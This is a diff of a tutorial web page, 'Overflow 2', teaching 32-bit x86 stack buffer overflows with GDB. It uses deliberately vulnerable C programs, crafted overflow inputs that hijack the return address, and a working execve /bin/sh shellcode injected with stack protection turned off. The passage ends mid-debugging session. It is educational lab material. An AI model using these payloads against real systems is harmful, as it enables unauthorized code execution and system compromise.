@@ -31,7 +31,7 @@
 
 
         
-    <div class="book"  data-level="6.2" data-basepath="..\.." data-revision="1420612248596">
+    <div class="book"  data-level="6.2" data-basepath="..\.." data-revision="1420946084317">
     
 
 <div class="book-summary">
@@ -481,9 +481,476 @@
                 <div class="page-inner">
                 
                 
-                    <section class="normal" id="section-gitbook_748">
+                    <section class="normal" id="section-gitbook_271">
                     
                         <h1 id="overflow-2">Overflow 2</h1>
+<h3 id="a-little-review">A Little Review</h3>
+<p>We learned about the basics of binaries in Overflow 1. If you have not read through Overflow 1 or forgot most of it, I recommend that you review a little before reading on. The important thing we need to remember is that functions vulnerable to overflow such as gets(), memcpy, and strcpy() do not perform boundary checks before executing. They also write data towards the base of the stack (higher memory addresses).</p>
+<h3 id="eip-register">EIP Register</h3>
+<p>The EIP register or Instruction Pointer is a register that always contains the address of the next instruction to be executed. EIP cannot be modified directly. However, it can be modified indirectly when functions are called or when jumps are made. Notice how EDB puts a green arrow next to memory address specified by the EIP register.</p>
+<p><img src="001.png" alt="" title="Figure 1: EIP location in ex1"></p>
+<p>Because the EIP register points to the NEXT instruction that will be executed, the instruction has not yet been executed. This is why I told you in the previous lesson that you have to refer to the next image to see the propagated changes in the register and memory. While learning about all of the concepts and interactions of EIP register itself is not very interesting, executing arbitrary instructions by exploiting the EIP register can be ;).</p>
+<h3 id="functions">Functions</h3>
+<p>Most programming languages are built on functions. C (and C++/C#) is no exception. Any compiled program is essentially a collection of functions calling each other to perform a certain task. In fact, the main component of a C program is a function called main() if you haven&#39;t noticed. To better understand functions, we will create a program that has more than just the main() function.</p>
+<pre><code class="lang-c"><span class="hljs-comment">/*Example 3*/</span>
+<span class="hljs-preprocessor">#<span class="hljs-keyword">include</span> &lt;stdio.h&gt;</span>
+<span class="hljs-preprocessor">#<span class="hljs-keyword">include</span> &lt;string.h&gt;</span>
+
+<span class="hljs-keyword">int</span> func(<span class="hljs-keyword">int</span> x)
+{
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, x);
+}
+
+<span class="hljs-keyword">int</span> main()
+{
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Start\n"</span>);
+    func(<span class="hljs-number">15</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"End\n"</span>);
+}
+</code></pre>
+<p>The program above does very simple and straightforward things. It prints out &quot;Start&quot; and calls another function name func() while passing it the integer 15. Func() takes the integer and prints it out. Then, the program prints out &quot;End.&quot; We need to analyze how the function calls work by looking at the memory and registers in detail.</p>
+<p><img src="ex3asm.png" alt="" title="Figure 2: Assembly of ex3 shown in EDB"></p>
+<p>Notice in figure 2 that the structure of the program stored in the memory is like the file. 0804:844c - 0804:8466 is func() and 0804:8467-0804:8495 is main(). Files are loaded from lower memory addresses to higher memory addresses (which makes more logical sense). The call at 0804:8483 is calling func(), meaning that the mov before is passing it an integer argument of 15. Again, I am not going to continue to pester you with assembly code. Instead, we will look at the memory before and after the function call.</p>
+<p><img src="funcall.png" alt="" title="Figure 3: Before and After &#39;call func()&#39; in ex3"></p>
+<p>The before image was taken right after the execution of 0804:847c. The integer 15 (0F) has just been moved into the memory at ESP. The after image was taken right after a step from 0804:8483 (we would now be in the function func() and the green arrow would point to 0804:844c). Notice that the value pushed into the memory is the address of the instruction after &quot;call 0x08004844c&quot;. 08048488 is the address the program is going to jump to after func() completes. We call this the return address. We can generalize the stack appearance after a function call.</p>
+<pre><code>Lower Memory Address
+
+|00000000|        ESP of new function
+**********        (omitted data)
+|00000000|        Start of new function&#39;s allocated memory
+|00000000|        Saved EBP (from push EBP)
+|00000000|        Return Address (saved EIP)
+|00000000|        Argument 1
+**********        (omitted data)
+|00000000|        Last Argument (bottom of stack)
+
+Higher Memory Address
+</code></pre><p>If you are already formulating a plan on how to exploit function returns and calls, you are one step closer to becoming a true hacker :p. However, we need to learn something else before proceeding to exploit the binary.</p>
+<h3 id="from-e-to-g">From E to G</h3>
+<p>So far, we have been using a graphical debugging tool known as EDB. However, that debugger is not as versatile or as powerful as GDB: the GNU Project debugger. GDB comes with some Linux distributions. We will replicate the disassembly and analysis of ex3 in GDB.</p>
+<pre><code>root@kali:~/Desktop# gdb
+(gdb) file ex3
+Reading symbols from /root/Desktop/ex3...(no debugging symbols found)...done.
+(gdb) set disassembly-flavor intel
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x08048467 &lt;+0&gt;:        push   ebp
+   0x08048468 &lt;+1&gt;:        mov    ebp,esp
+   0x0804846a &lt;+3&gt;:        and    esp,0xfffffff0
+   0x0804846d &lt;+6&gt;:        sub    esp,0x10
+   0x08048470 &lt;+9&gt;:        mov    DWORD PTR [esp],0x8048534
+   0x08048477 &lt;+16&gt;:    call   0x8048330 &lt;puts@plt&gt;
+   0x0804847c &lt;+21&gt;:    mov    DWORD PTR [esp],0xf
+   0x08048483 &lt;+28&gt;:    call   0x804844c &lt;func&gt;
+   0x08048488 &lt;+33&gt;:    mov    DWORD PTR [esp],0x804853a
+   0x0804848f &lt;+40&gt;:    call   0x8048330 &lt;puts@plt&gt;
+   0x08048494 &lt;+45&gt;:    leave
+   0x08048495 &lt;+46&gt;:    ret
+End of assembler dump.
+(gdb) disassemble func
+Dump of assembler code for function func:
+   0x0804844c &lt;+0&gt;:        push   ebp
+   0x0804844d &lt;+1&gt;:        mov    ebp,esp
+   0x0804844f &lt;+3&gt;:        sub    esp,0x18
+   0x08048452 &lt;+6&gt;:        mov    eax,DWORD PTR [ebp+0x8]
+   0x08048455 &lt;+9&gt;:        mov    DWORD PTR [esp+0x4],eax
+   0x08048459 &lt;+13&gt;:    mov    DWORD PTR [esp],0x8048530
+   0x08048460 &lt;+20&gt;:    call   0x8048320 &lt;printf@plt&gt;
+   0x08048465 &lt;+25&gt;:    leave
+   0x08048466 &lt;+26&gt;:    ret
+End of assembler dump.
+(gdb) break *0x0804847c
+Breakpoint 1 at 0x804847c
+(gdb) run
+Starting program: /root/Desktop/ex3
+Start
+
+Breakpoint 1, 0x0804847c in main ()
+(gdb) si
+0x08048483 in main ()
+(gdb) x /20x $esp
+0xbffff4e0:    0x0000000f    0xb7ff0590    0x080484bb    0xb7fbeff4
+0xbffff4f0:    0x080484b0    0x00000000    0xbffff578    0xb7e75e66
+0xbffff500:    0x00000001    0xbffff5a4    0xbffff5ac    0xb7fe0860
+0xbffff510:    0xb7ff6821    0xffffffff    0xb7ffeff4    0x0804826d
+0xbffff520:    0x00000001    0xbffff560    0xb7fefc16    0xb7fffac0
+(gdb) si
+0x0804844c in func ()
+(gdb) x /20x $esp
+0xbffff4dc:    0x08048488    0x0000000f    0xb7ff0590    0x080484bb
+0xbffff4ec:    0xb7fbeff4    0x080484b0    0x00000000    0xbffff578
+0xbffff4fc:    0xb7e75e66    0x00000001    0xbffff5a4    0xbffff5ac
+0xbffff50c:    0xb7fe0860    0xb7ff6821    0xffffffff    0xb7ffeff4
+0xbffff51c:    0x0804826d    0x00000001    0xbffff560    0xb7fefc16
+</code></pre><p>Line 2: Loading the file into GDB.</p>
+<p>Line 4: Setting the output ASM to intel syntax (GDB&#39;s default is AT&amp;T).</p>
+<p>Line 5: Disassemble main().</p>
+<p>Line 20: Disassemble func().</p>
+<p>Line 32: Make a breakpoint at 0x0804847c (before copying 15 into memory).</p>
+<p>Line 34: Run the program.</p>
+<p>Line 39: Step into (execute one line of instruction).</p>
+<p>Line 41: View the memory starting at the ESP stack pointer in hex format.</p>
+<p>Line 47: Step into (execute one line of instruction).</p>
+<p>Line 49: View the memory starting at the ESP stack pointer in hex format.</p>
+<p>Do you notice how it is possible to do the same thing with GDB? You might wonder how GDB is more powerful. Primarily, GDB is powerful because it is highly programmable and can interface with Python and other Linux tools. While EDB is good for debugging and assembling programs, GDB is faster and more effective for our purpose. Plus, using it makes you more awesome.</p>
+<h3 id="mathematically-computing-overflows">Mathematically Computing Overflows</h3>
+<p>Let&#39;s look at an example of a vulnerable application.</p>
+<pre><code class="lang-c"><span class="hljs-comment">/*Example 4*/</span>
+<span class="hljs-preprocessor">#<span class="hljs-keyword">include</span> &lt;stdio.h&gt;</span>
+<span class="hljs-preprocessor">#<span class="hljs-keyword">include</span> &lt;stdlib.h&gt;</span>
+<span class="hljs-preprocessor">#<span class="hljs-keyword">include</span> &lt;string.h&gt;</span>
+
+<span class="hljs-keyword">int</span> func(<span class="hljs-keyword">int</span> auth, <span class="hljs-keyword">char</span> *str)
+{
+    <span class="hljs-keyword">char</span> data[<span class="hljs-number">100</span>];
+    <span class="hljs-built_in">strcpy</span>(data, str);
+    <span class="hljs-keyword">if</span>(auth == <span class="hljs-number">1</span>)
+    {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Secret!\n"</span>);
+    }
+    <span class="hljs-keyword">else</span>
+    {
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+    }
+}
+
+<span class="hljs-keyword">int</span> main(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])
+{
+    <span class="hljs-keyword">if</span>(argc != <span class="hljs-number">2</span>)
+    {
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+    }
+    func(<span class="hljs-number">0</span>, argv[<span class="hljs-number">1</span>]);
+}
+</code></pre>
+<p>Our initial reaction might be to use the generalized function call stack to compute the number of padding characters necessary. However, this is not exactly the case. While the program does allocate 100 bytes for the character, it also allocates additional bytes for the function itself. We need to analyze further using GDB.</p>
+<pre><code>(gdb) disassemble func
+Dump of assembler code for function func:
+   0x0804847c &lt;+0&gt;:        push   ebp
+   0x0804847d &lt;+1&gt;:        mov    ebp,esp
+   0x0804847f &lt;+3&gt;:        sub    esp,0x88
+   0x08048485 &lt;+9&gt;:        mov    eax,DWORD PTR [ebp+0xc]
+   0x08048488 &lt;+12&gt;:    mov    DWORD PTR [esp+0x4],eax
+   0x0804848c &lt;+16&gt;:    lea    eax,[ebp-0x6c]
+   0x0804848f &lt;+19&gt;:    mov    DWORD PTR [esp],eax
+   0x08048492 &lt;+22&gt;:    call   0x8048340 &lt;strcpy@plt&gt;
+   0x08048497 &lt;+27&gt;:    cmp    DWORD PTR [ebp+0x8],0x1
+   0x0804849b &lt;+31&gt;:    jne    0x80484ab &lt;func+47&gt;
+   0x0804849d &lt;+33&gt;:    mov    DWORD PTR [esp],0x8048580
+   0x080484a4 &lt;+40&gt;:    call   0x8048350 &lt;puts@plt&gt;
+   0x080484a9 &lt;+45&gt;:    jmp    0x80484b7 &lt;func+59&gt;
+   0x080484ab &lt;+47&gt;:    mov    DWORD PTR [esp],0x0
+   0x080484b2 &lt;+54&gt;:    call   0x8048370 &lt;exit@plt&gt;
+   0x080484b7 &lt;+59&gt;:    leave
+   0x080484b8 &lt;+60&gt;:    ret
+End of assembler dump.
+</code></pre><p>Notice that there is a new instruction here called lea. Lea simply calculates an addition or subtraction to memory and moves it into a register. The program allocates 136 bytes in the beginning (0x88 = 136). However, this is not very helpful, as we know that the 100 bytes allocated for the text won&#39;t be placed exactly at the top where the ESP is pointing. We can use the lea instruction to determine the location of the buffer instead. Lea in this program is part of the strcpy() function. It is indicating the location for strcpy() to start working. The EBP we know is currently 136 bytes away from ESP. Lea just told us that strcpy() will start copying 108 bytes away from EBP. Lucky us. We now know that the start of the buffer is 28 bytes from ESP. We also know that we are only dealing 108 bytes above the stored EBP value. This makes it easy to apply the general function stack appearance. Starting at the top of the stack, it is 28 bytes to the buffer. The buffer is only 100 bytes meaning that there is an additional 8 bytes we need to fill, making the total padding 108 bytes. To get to argument 1, we also need to overwrite the saved EBP value and return address (segmentation fault here we come). This makes an additional 8 bytes for a total padding of 116 bytes. Finally. We can send 116 bytes of anything and then a 1 to perform this buffer overflow.</p>
+<p><img src="ex4overflow.png" alt="" title="Figure 4: Performing a buffer overflow on ex4"></p>
+<p>Magic. This is pure magic. Let&#39;s look at all the Bs in the memory using GDB.</p>
+<pre><code>(gdb) break *0x08048497
+Breakpoint 1 at 0x8048497
+(gdb) run &quot;`python -c &#39;print &quot;B&quot;*116 + &quot;\x01&quot;&#39;`&quot;
+Starting program: /root/Desktop/ex4 &quot;`python -c &#39;print &quot;B&quot;*116 + &quot;\x01&quot;&#39;`&quot;
+
+Breakpoint 1, 0x08048497 in func ()
+(gdb) x /50x $esp
+0xbffff3e0:    0xbffff3fc    0xbffff697    0xb7ffeff4    0xbffff4e0
+0xbffff3f0:    0xb7fffac0    0xbffff4b4    0xb7feb662    0x42424242
+0xbffff400:    0x42424242    0x42424242    0x42424242    0x42424242
+0xbffff410:    0x42424242    0x42424242    0x42424242    0x42424242
+0xbffff420:    0x42424242    0x42424242    0x42424242    0x42424242
+0xbffff430:    0x42424242    0x42424242    0x42424242    0x42424242
+0xbffff440:    0x42424242    0x42424242    0x42424242    0x42424242
+0xbffff450:    0x42424242    0x42424242    0x42424242    0x42424242
+0xbffff460:    0x42424242    0x42424242    0x42424242    0x42424242
+0xbffff470:    0x00000001    0xbffff697    0x0804850b    0xb7fbeff4
+0xbffff480:    0x08048500    0x00000000    0xbffff508    0xb7e75e66
+0xbffff490:    0x00000002    0xbffff534    0xbffff540    0xb7fe0860
+0xbffff4a0:    0xb7ff6821    0xffffffff
+(gdb) continue
+Continuing.
+Secret!
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+</code></pre><p>If you haven&#39;t caught on as to why I use Bs instead of As, it&#39;s because B is represented by 42 in hex. But aside from that, I will direct your attention to what we overwrote that is causing the segmentation fault. At 0xbffff46c (last WORD of the 0xbffff460 line), the return address has been replaced by the magnificent 0x42424242. Obviously 0x42424242 is not a valid memory address for this program, so the program basically crashes (and possibly burns). However, what if replace the return address with something that is actually valid? Would the program still execute instructions at the new return address?</p>
+<h3 id="messing-with-the-return">Messing With the Return</h3>
+<p>Let&#39;s look at a modified version of example 4.</p>
+<pre><code class="lang-c"><span class="hljs-comment">/*Example 5*/</span>
+<span class="hljs-preprocessor">#<span class="hljs-keyword">include</span> &lt;stdio.h&gt;</span>
+<span class="hljs-preprocessor">#<span class="hljs-keyword">include</span> &lt;stdlib.h&gt;</span>
+<span class="hljs-preprocessor">#<span class="hljs-keyword">include</span> &lt;string.h&gt;</span>
+
+<span class="hljs-keyword">void</span> lonely(<span class="hljs-keyword">void</span>)
+{
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Better secret!!\n"</span>);
+}
+
+<span class="hljs-keyword">int</span> func(<span class="hljs-keyword">int</span> auth, <span class="hljs-keyword">char</span> *str)
+{
+    <span class="hljs-keyword">char</span> data[<span class="hljs-number">32</span>];
+    <span class="hljs-built_in">strcpy</span>(data, str);
+    <span class="hljs-keyword">if</span>(auth == <span class="hljs-number">1</span>)
+    {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Secret!\n"</span>);
+    }
+    <span class="hljs-keyword">else</span>
+    {
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+    }
+}
+
+<span class="hljs-keyword">int</span> main(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])
+{
+    <span class="hljs-keyword">if</span>(argc != <span class="hljs-number">2</span>)
+    {
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+    }
+    func(<span class="hljs-number">0</span>, argv[<span class="hljs-number">1</span>]);
+}
+</code></pre>
+<p>The program works exactly the same as example 4, except there is another function that is never called. First, let&#39;s get an output of &quot;Secret!&quot; using the skills that we have learned.</p>
+<pre><code>(gdb) set disassembly-flavor intel
+(gdb) file ex5
+Reading symbols from /root/Desktop/ex5...(no debugging symbols found)...done.
+(gdb) info functions
+All defined functions:
+
+Non-debugging symbols:
+0x08048300  _init
+0x08048340  strcpy
+0x08048340  strcpy@plt
+0x08048350  puts
+0x08048350  puts@plt
+0x08048360  __gmon_start__
+0x08048360  __gmon_start__@plt
+0x08048370  exit
+0x08048370  exit@plt
+0x08048380  __libc_start_main
+0x08048380  __libc_start_main@plt
+0x08048390  _start
+0x080483c0  deregister_tm_clones
+0x080483f0  register_tm_clones
+0x08048430  __do_global_dtors_aux
+0x08048450  frame_dummy
+0x0804847c  lonely
+0x08048490  func
+0x080484ca  main
+0x08048500  __libc_csu_fini
+---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
+0x08048510  __libc_csu_init
+0x0804856a  __i686.get_pc_thunk.bx
+0x08048570  _fini
+(gdb) disassemble func
+Dump of assembler code for function func:
+   0x08048490 &lt;+0&gt;:        push   ebp
+   0x08048491 &lt;+1&gt;:        mov    ebp,esp
+   0x08048493 &lt;+3&gt;:        sub    esp,0x38
+   0x08048496 &lt;+6&gt;:        mov    eax,DWORD PTR [ebp+0xc]
+   0x08048499 &lt;+9&gt;:        mov    DWORD PTR [esp+0x4],eax
+   0x0804849d &lt;+13&gt;:    lea    eax,[ebp-0x28]
+   0x080484a0 &lt;+16&gt;:    mov    DWORD PTR [esp],eax
+   0x080484a3 &lt;+19&gt;:    call   0x8048340 &lt;strcpy@plt&gt;
+   0x080484a8 &lt;+24&gt;:    cmp    DWORD PTR [ebp+0x8],0x1
+   0x080484ac &lt;+28&gt;:    jne    0x80484bc &lt;func+44&gt;
+   0x080484ae &lt;+30&gt;:    mov    DWORD PTR [esp],0x80485a0
+   0x080484b5 &lt;+37&gt;:    call   0x8048350 &lt;puts@plt&gt;
+   0x080484ba &lt;+42&gt;:    jmp    0x80484c8 &lt;func+56&gt;
+   0x080484bc &lt;+44&gt;:    mov    DWORD PTR [esp],0x0
+   0x080484c3 &lt;+51&gt;:    call   0x8048370 &lt;exit@plt&gt;
+   0x080484c8 &lt;+56&gt;:    leave
+   0x080484c9 &lt;+57&gt;:    ret
+End of assembler dump.
+</code></pre><p>Seems easy enough. Convert 0x28 to decimal and you&#39;ll get 40 bytes. Add an additional 8 bytes for the saved EBP value and return address for a total padding of 48 bytes. Let&#39;s see if this works.</p>
+<p><img src="ex5sec.png" alt="" title="Figure 5: Performing a buffer overflow on ex5"></p>
+<p>Didn&#39;t this just get a whole lot easier once you understand how it works? However, we still received a segmentation fault. In addition, the function that was never called is still not called. What if we wanted both the secret AND the better secret? The solution is very simple, but we need to learn something about a thing called endianness.</p>
+<h3 id="endianness">Endianness</h3>
+<p>There are two types of endian formats. Endian formats are simply the order in which data is stored. Big endian stores the most significant byte in the smallest address while little endian stores the least significant byte in the smallest address. The endianness depends completely on the processor and not the operating system. What we need to know is that memory data created by the x86 processor is represented in little endian. Let&#39;s look at how strcpy copies things into the memory.</p>
+<pre><code>0xbffff460:    0x42424242    0x42424242    0x42424242    0x42424242
+            &lt;----1----  &lt;----2----  &lt;----3----  &lt;----4----
+0xbffff470:    0x00000001    0xbffff697    0x0804850b    0xb7fbeff4
+            &lt;----5----
+</code></pre><p>Notice how it goes from right to left inside of a WORD? This is why we simply need a &quot;\x01&quot; to change the whole WORD to a 1 rather than &quot;\x00\x00\x00\x01&quot;. What this also means is that the bytes need to be reversed when we perform overflows where we are not only using one letter or manipulating one thing.</p>
+<h3 id="back-to-return">Back to Return</h3>
+<p>Let&#39;s get back to example 5. We already know the structure of a stack after a function call. The return address is the one right above argument 1. What we want the program to do is to run the lonely() function after finishing func(). To do this, we simply need to modify the return address and point it to where lonely() is in the memory. This shouldn&#39;t be too hard any more.</p>
+<pre><code>(gdb) disassemble lonely
+Dump of assembler code for function lonely:
+   0x0804847c &lt;+0&gt;:        push   ebp
+   0x0804847d &lt;+1&gt;:        mov    ebp,esp
+   0x0804847f &lt;+3&gt;:        sub    esp,0x18
+   0x08048482 &lt;+6&gt;:        mov    DWORD PTR [esp],0x8048590
+   0x08048489 &lt;+13&gt;:    call   0x8048350 &lt;puts@plt&gt;
+   0x0804848e &lt;+18&gt;:    leave
+   0x0804848f &lt;+19&gt;:    ret
+End of assembler dump.
+</code></pre><p>Lonely is located at 0x0804847c. We need to reverse the bytes because of the little endian structure employed by Intel processors. 0x0804847c would become &quot;\x7c\x84\x04\x08&quot;. We knew that 48 bytes of padding took us to argument 1. However, we don&#39;t want to overwrite the return address with Bs any more. We want to overwrite it with lonely()&#39;s address. Since the saved return address is right before argument 1, we now only need 44 bytes of padding followed by the new memory address and a &quot;\x01&quot; to complete this overflow.</p>
+<p><img src="betterseg.png" alt="" title="Figure 6: Calling lonely() in ex5 using overflow"></p>
+<p>You might wonder why a segmentation fault still occurs. This is still due to the fact that the program is not returning to the main function and exiting properly. The original return address was pointed at the end of main but we&#39;ve moved it to point to lonely(). After lonely() completes, it returns to an invalid address outside of func().</p>
+<h3 id="shellcode">Shellcode</h3>
+<p>We know we can perform all of the fancy overflows and stuff but what if we wanted to compromise a whole system by using overflow? To do this, we will need the assistance of a shellcode. A shell code is a minute piece of code (usually no larger than 200 bytes) that generally executes a command shell on the machine. In Linux, it would be bin/sh. However, a shellcode can perform anything the attacker wants because it has the same privilege as the process used to spawn it. Shell-storm.org has a list of shellcodes for different operating systems as well as processor architectures. I will use one of them as an example. First, we&#39;ll need a program to test it on.</p>
+<pre><code class="lang-c"><span class="hljs-comment">/*Example 6*/</span>
+<span class="hljs-preprocessor">#<span class="hljs-keyword">include</span> &lt;string.h&gt;</span>
+<span class="hljs-preprocessor">#<span class="hljs-keyword">include</span> &lt;stdlib.h&gt;</span>
+<span class="hljs-preprocessor">#<span class="hljs-keyword">include</span> &lt;stdio.h&gt;</span>
+
+<span class="hljs-keyword">void</span> main(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])
+{
+    <span class="hljs-keyword">if</span>(argc != <span class="hljs-number">2</span>)
+    {
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+    }
+    <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">64</span>];
+    <span class="hljs-built_in">strcpy</span>(buffer, argv[<span class="hljs-number">1</span>]);
+}
+</code></pre>
+<p>This program does virtually nothing. However, it is still vulnerable to shellcode. We could try to have the program execute shellcode in the buffer. However, most compilers are smart enough to prevent this from happening. We need to somehow load the shellcode into the memory, find its address, and then execute it. The shell code we are going to use is shown below.</p>
+<pre><code>&quot;\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80&quot;
+</code></pre><p>It is only 32 bytes and executes a shell. 32 bytes is less than the buffer of 64 bytes so we could easily just put the shell into the buffer and overwrite the return address with starting location of the shell. This is where things start to get really tricky. First, the some parts of the stack are protected from execution. We will bypass this by compiling the program with stack execution enabled.</p>
+<pre><code>gcc -fno-stack-protector -z execstack -o ex6 ex6.c
+</code></pre><p>Let&#39;s analyze this program using GDB.</p>
+<pre><code>(gdb) set disassembly-flavor intel
+(gdb) file ex6
+Reading symbols from /root/Desktop/ex6...(no debugging symbols found)...done.
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x0804844c &lt;+0&gt;:        push   ebp
+   0x0804844d &lt;+1&gt;:        mov    ebp,esp
+   0x0804844f &lt;+3&gt;:        and    esp,0xfffffff0
+   0x08048452 &lt;+6&gt;:        sub    esp,0x50
+   0x08048455 &lt;+9&gt;:        cmp    DWORD PTR [ebp+0x8],0x2
+   0x08048459 &lt;+13&gt;:    je     0x8048467 &lt;main+27&gt;
+   0x0804845b &lt;+15&gt;:    mov    DWORD PTR [esp],0x0
+   0x08048462 &lt;+22&gt;:    call   0x8048340 &lt;exit@plt&gt;
+   0x08048467 &lt;+27&gt;:    mov    eax,DWORD PTR [ebp+0xc]
+   0x0804846a &lt;+30&gt;:    add    eax,0x4
+   0x0804846d &lt;+33&gt;:    mov    eax,DWORD PTR [eax]
+   0x0804846f &lt;+35&gt;:    mov    DWORD PTR [esp+0x4],eax
+   0x08048473 &lt;+39&gt;:    lea    eax,[esp+0x10]
+   0x08048477 &lt;+43&gt;:    mov    DWORD PTR [esp],eax
+   0x0804847a &lt;+46&gt;:    call   0x8048320 &lt;strcpy@plt&gt;
+   0x0804847f &lt;+51&gt;:    leave
+   0x08048480 &lt;+52&gt;:    ret
+End of assembler dump.
+(gdb) break *0x0804847f
+Breakpoint 1 at 0x804847f
+(gdb) run $(python -c &#39;print &quot;B&quot;*64&#39;)
+Starting program: /root/Desktop/ex6 $(python -c &#39;print &quot;B&quot;*64&#39;)
+
+Breakpoint 1, 0x0804847f in main ()
+(gdb) x /40x $esp
+0xbffff460:    0xbffff470    0xbffff6cc    0xbffff487    0x00000001
+0xbffff470:    0x42424242    0x42424242    0x42424242    0x42424242
+0xbffff480:    0x42424242    0x42424242    0x42424242    0x42424242
+0xbffff490:    0x42424242    0x42424242    0x42424242    0x42424242
+0xbffff4a0:    0x42424242    0x42424242    0x42424242    0x42424242
+0xbffff4b0:    0x08048400    0x00000000    0xbffff538    0xb7e75e66
+0xbffff4c0:    0x00000002    0xbffff564    0xbffff570    0xb7fe0860
+0xbffff4d0:    0xb7ff6821    0xffffffff    0xb7ffeff4    0x0804826d
+0xbffff4e0:    0x00000001    0xbffff520    0xb7fefc16    0xb7fffac0
+0xbffff4f0:    0xb7fe0b58    0xb7fbeff4    0x00000000    0x00000000
+(gdb) break *0x0804844d
+Breakpoint 2 at 0x804844d
+(gdb) run $(python -c &#39;print &quot;B&quot;*64&#39;)
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /root/Desktop/ex6 $(python -c &#39;print &quot;B&quot;*64&#39;)
+
+Breakpoint 2, 0x0804844d in main ()
+(gdb) x /40x $esp
+0xbffff4b8:    0xbffff538    0xb7e75e66    0x00000002    0xbffff564
+0xbffff4c8:    0xbffff570    0xb7fe0860    0xb7ff6821    0xffffffff
+0xbffff4d8:    0xb7ffeff4    0x0804826d    0x00000001    0xbffff520
+0xbffff4e8:    0xb7fefc16    0xb7fffac0    0xb7fe0b58    0xb7fbeff4
+0xbffff4f8:    0x00000000    0x00000000    0xbffff538    0xdb0169dd
+0xbffff508:    0xea54bfcd    0x00000000    0x00000000    0x00000000
+0xbffff518:    0x00000002    0x08048360    0x00000000    0xb7ff59c0
+0xbffff528:    0xb7e75d8b    0xb7ffeff4    0x00000002    0x08048360
+0xbffff538:    0x00000000    0x08048381    0x0804844c    0x00000002
+0xbffff548:    0xbffff564    0x080484a0    0x08048490    0xb7ff0590
+</code></pre><p>From breakpoint 2, we discovered that 0xbffff538 is the saved EBP and that 0xb7e75e66 is the return address. This means we have 76 bytes before we need to overwrite the return address. Seems pretty easy. Well, it&#39;s not :p. We will now put the shellcode at the beginning and fill the rest with Bs. We&#39;ll also replace the return address with Bs just to make sure it works.</p>
+<pre><code>(gdb) break *0x0804847f
+Breakpoint 1 at 0x804847f
+(gdb) run $(python -c &#39;print &quot;\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80&quot; + &quot;B&quot;*48&#39;)
+Starting program: /root/Desktop/ex6 $(python -c &#39;print &quot;\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80&quot; + &quot;B&quot;*48&#39;)
+
+Breakpoint 1, 0x0804847f in main ()
+(gdb) x /40x $esp
+0xbffff450:    0xbffff460    0xbffff6bc    0xbffff477    0x00000001
+0xbffff460:    0xc389c031    0x80cd17b0    0x6852d231    0x68732f6e
+0xbffff470:    0x622f2f68    0x52e38969    0x8de18953    0x80cd0b42
+0xbffff480:    0x42424242    0x42424242    0x42424242    0x42424242
+0xbffff490:    0x42424242    0x42424242    0x42424242    0x42424242
+0xbffff4a0:    0x42424242    0x42424242    0x42424242    0x42424242
+0xbffff4b0:    0x00000000    0xbffff554    0xbffff560    0xb7fe0860
+0xbffff4c0:    0xb7ff6821    0xffffffff    0xb7ffeff4    0x0804826d
+0xbffff4d0:    0x00000001    0xbffff510    0xb7fefc16    0xb7fffac0
+0xbffff4e0:    0xb7fe0b58    0xb7fbeff4    0x00000000    0x00000000
+(gdb) continue
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+</code></pre><p>Can you spot the difference? ESP was originally pointed to 0xbffff460 when we injected 64 Bs. Now when we add the shellcode, it somehow points to 0xbffff450. This change is caused by the addition of the shellcode and must be taken into account when we point the return address to the shellcode. Size changes of strcpy beyond the buffer can change the ESP value. However, as long as we keep the size the same, the shellcode will still be located at 0xbffff460. We will do the same procedure as before except we will replace the last 4 bytes with the address of the shellcode.</p>
+<pre><code>(gdb) run $(python -c &#39;print &quot;\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80&quot; + &quot;B&quot;*44 + &quot;\x60\xf4\xff\xbf&quot;&#39;)
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /root/Desktop/ex6 $(python -c &#39;print &quot;\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80&quot; + &quot;B&quot;*44 + &quot;\x60\xf4\xff\xbf&quot;&#39;)
+
+Breakpoint 1, 0x0804847f in main ()
+(gdb) x /40x $esp
+0xbffff450:    0xbffff460    0xbffff6bc    0xbffff477    0x00000001
+0xbffff460:    0xc389c031    0x80cd17b0    0x6852d231    0x68732f6e
+0xbffff470:    0x622f2f68    0x52e38969    0x8de18953    0x80cd0b42
